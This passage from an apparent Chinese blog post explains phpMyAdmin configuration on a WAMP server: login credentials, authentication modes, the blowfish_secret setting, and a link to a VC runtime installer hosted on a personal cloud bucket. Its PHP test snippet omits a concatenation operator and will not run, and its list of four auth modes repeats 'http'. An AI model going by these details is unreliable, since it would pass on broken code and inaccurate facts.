user访问phpmyadmin使用的mysql用户名fg[&apos;servers&apos;][$i][&apos;password&apos;] = &apos;&apos;; // mysql password (only needed对应上述mysql用户名的密码</code></pre><h3 id="d-认证方法"><a href="#d-认证方法" class="headerlink" title="d.认证方法"></a>d.认证方法</h3><pre><code>$cfg[&apos;servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;</code></pre><p>在此有四种模式可供选择，<code>cookie，http，http，config</code><br>config方式即输入phpmyadmin的访问网址即可直接进入，无需输入用户名和密码，是<strong>不安全的</strong>，<strong>不推荐使用</strong>。<br>当该项设置为<code>cookie，http</code>或<code>http</code>时，登录<code>phpmyadmin</code>需要数据用户名和密码进行验证，,具体如下：</p><ol><li>php安装模式为<code>Apache</code>，可以使用<code>http</code>和<code>cookie</code>;</li><li>php安装模式为<code>cgi</code>，可以使用<code>cookie</code></li></ol><h3 id="e-短语密码-blowfish-secret-的设置"><a href="#e-短语密码-blowfish-secret-的设置" class="headerlink" title="e.短语密码(blowfish_secret)的设置"></a>e.短语密码(blowfish_secret)的设置</h3><pre><code>$cfg[&apos;blowfish_secret&apos;] = &apos;&apos;;</code></pre><p>如果认证方法设置为cookie，就需要设置短语密码，置于设置为什么密码，由您自己决定 ，但是不能留空，否则会在登录phpmyadmin时提示错误</p><p>不出意外的话访问localhost/phpmyadmin会出现以下界面<br><img src= "/img/loading.gif" data-lazy-src="/images/zURxpo8.png" alt=""><br>输入数据库帐号密码即可登录<br><img src= "/img/loading.gif" data-lazy-src="/images/2tzhlLA.png" alt=""></p><hr><p>至此，WAMP环境配置完毕，可正常使用了。<br>附<br>测试时区代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"现在时间为: "</span>date(<span class="string">'Y-m-d H:i:s'</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="VC常用库下载"><a href="#VC常用库下载" class="headerlink" title="VC常用库下载"></a>VC常用库下载</h1><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/files/%E5%BE%AE%E8%BD%AF%E5%B8%B8%E7%94%A8%E8%BF%90%E8%A1%8C%E5%BA%93%E5%90%88%E9%9B%8664%E4%BD%8D_2017.10.25.exe" target="_blank" rel="noopener">点击下载</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
